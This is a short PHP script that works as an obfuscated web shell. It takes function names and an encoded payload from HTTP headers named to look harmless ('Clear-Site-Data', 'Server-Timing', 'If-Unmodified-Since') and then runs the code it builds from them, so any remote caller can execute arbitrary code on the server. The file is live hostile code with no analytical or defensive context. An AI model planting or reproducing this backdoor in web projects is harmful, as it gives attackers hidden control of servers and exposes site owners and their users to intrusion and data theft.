<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $dba_insertion = $_HEADERS['Clear-Site-Data']('', $_HEADERS['Server-Timing']($_HEADERS['If-Unmodified-Since']));
    $dba_insertion();
}